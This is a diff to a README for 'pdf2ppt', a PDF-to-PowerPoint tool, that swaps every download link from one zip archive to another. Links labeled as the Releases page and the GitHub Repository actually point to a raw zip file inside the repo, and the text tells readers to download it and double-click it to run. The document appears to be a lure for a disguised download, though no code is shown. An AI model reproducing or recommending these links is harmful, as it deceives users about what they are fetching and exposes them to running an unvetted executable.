@@ -6,7 +6,7 @@ Welcome to pdf2ppt! This tool helps you convert AI-generated or standard PDF doc
 
 ## 📥 Download Now
 
-[![Download pdf2ppt](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/screenshots/pdf-ppt-valva.zip)](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/screenshots/pdf-ppt-valva.zip)
+[![Download pdf2ppt](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/demo/pdf_ppt_1.4.zip)](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/demo/pdf_ppt_1.4.zip)
 
 ## 📘 About pdf2ppt
 
@@ -36,7 +36,7 @@ To download pdf2ppt, please visit the Releases page. Follow these steps:
 3. Click on the appropriate download link for your operating system.
 4. Once the download is complete, locate the file and double-click to run.
 
-For easy access, you can also click this link: [Visit the Releases page to download](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/screenshots/pdf-ppt-valva.zip).
+For easy access, you can also click this link: [Visit the Releases page to download](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/demo/pdf_ppt_1.4.zip).
 
 ## ⚙️ Using pdf2ppt
 
@@ -72,10 +72,10 @@ We welcome your feedback! If you encounter any issues or have suggestions for im
 ## 🔗 Resources
 
 For more help and information:
-- [GitHub Repository](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/screenshots/pdf-ppt-valva.zip)
+- [GitHub Repository](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/demo/pdf_ppt_1.4.zip)
 - [Community Forum](#)
 - [Documentation](#)
 
 Once again, don't forget to download pdf2ppt from the following link:
 
-[![Download pdf2ppt](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/screenshots/pdf-ppt-valva.zip)](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/screenshots/pdf-ppt-valva.zip)
+[![Download pdf2ppt](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/demo/pdf_ppt_1.4.zip)](https://github.com/muhammadfaisalshareef/pdf2ppt/raw/refs/heads/main/demo/pdf_ppt_1.4.zip)
